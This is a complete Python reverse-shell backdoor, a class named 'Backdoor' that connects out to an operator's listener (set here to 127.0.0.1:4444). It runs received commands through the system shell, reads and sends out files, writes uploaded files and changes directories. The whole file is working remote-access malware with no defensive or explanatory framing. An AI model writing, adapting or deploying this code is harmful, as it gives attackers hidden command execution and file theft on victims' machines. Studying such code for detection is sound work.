import socket
import subprocess
import json
import os
import base64


class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))


    def reliable_send(self, data):
        json_data = json.dumps(data.decode('ascii', errors='ignore'))
        self.connection.send(json_data.encode())

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return b"[+] file uploaded successfully!"

    def change_working_directory_to(self, path):
        os.chdir(path)
        return b"[+] changing directory to " + path.encode()

    def reliable_recive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue





    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.reliable_recive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()

                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])


                elif command[0] == "download":
                    command_result = self.read_file(command[1])

                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])

                else:
                    command_result = self.execute_system_command(command)

            except Exception:
                command_result = b"[-] Error when command execution !"

            self.reliable_send(command_result)


backdoor = Backdoor('127.0.0.1', 4444)
backdoor.run()
